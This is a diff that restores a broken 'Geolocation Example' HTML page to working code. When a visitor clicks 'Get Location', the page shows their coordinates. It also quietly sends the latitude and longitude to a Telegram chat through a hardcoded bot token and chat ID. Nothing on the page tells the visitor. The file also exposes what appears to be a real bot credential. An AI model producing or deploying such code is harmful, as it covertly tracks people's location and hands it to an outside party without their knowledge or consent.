@@ -1,63 +1,63 @@
-!DOCTYPE html
-html
-head
-    titleGeolocationtitle
-head
-body
-    h1Geolocation Exampleh1
-    button onclick=getLocation()Get Locationbutton
-    p id=locationp
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Geolocation</title>
+</head>
+<body>
+    <h1>Geolocation Example</h1>
+    <button onclick="getLocation()">Get Location</button>
+    <p id="location"></p>
     
-    script
+    <script>
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
             } else {
-                document.getElementById(location).innerHTML = Geolocation is not supported by this browser.;
+                document.getElementById("location").innerHTML = "Geolocation is not supported by this browser.";
             }
         }
         
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
-            document.getElementById(location).innerHTML = 
-            Latitude  + latitude + 
-            brLongitude  + longitude;
+            document.getElementById("location").innerHTML = 
+            "Latitude: " + latitude + 
+            "<br>Longitude: " + longitude;
 
-             Send location to Telegram bot
+            // Send location to Telegram bot
             sendLocationToTelegram(latitude, longitude);
         }
 
         function showError(error) {
             switch(error.code) {
-                case error.PERMISSION_DENIED
-                    document.getElementById(location).innerHTML = User denied the request for Geolocation.;
+                case error.PERMISSION_DENIED:
+                    document.getElementById("location").innerHTML = "User denied the request for Geolocation.";
                     break;
-                case error.POSITION_UNAVAILABLE
-                    document.getElementById(location).innerHTML = Location information is unavailable.;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("location").innerHTML = "Location information is unavailable.";
                     break;
-                case error.TIMEOUT
-                    document.getElementById(location).innerHTML = The request to get user location timed out.;
+                case error.TIMEOUT:
+                    document.getElementById("location").innerHTML = "The request to get user location timed out.";
                     break;
-                case error.UNKNOWN_ERROR
-                    document.getElementById(location).innerHTML = An unknown error occurred.;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById("location").innerHTML = "An unknown error occurred.";
                     break;
             }
         }
 
         function sendLocationToTelegram(latitude, longitude) {
-            var botToken = '7395889656AAEM67vs5lE1xRGWyTCBCb06GOFx9VkIFUg';
+            var botToken = '7395889656:AAEM67vs5lE1xRGWyTCBCb06GOFx9VkIFUg';
             var chatId = '-1002148840772';
-            var message = `User location Latitude ${latitude}, Longitude ${longitude}`;
+            var message = `User location: Latitude: ${latitude}, Longitude: ${longitude}`;
 
-             URL to send message to Telegram chat
-            var telegramUrl = `httpsapi.telegram.orgbot${botToken}sendMessagechat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            // URL to send message to Telegram chat
+            var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-             Create a new XMLHttpRequest object
+            // Create a new XMLHttpRequest object
             var xhr = new XMLHttpRequest();
-            xhr.open(GET, telegramUrl, true);
+            xhr.open("GET", telegramUrl, true);
             xhr.send();
         }
-    script
-body
-html
+    </script>
+</body>
+</html>
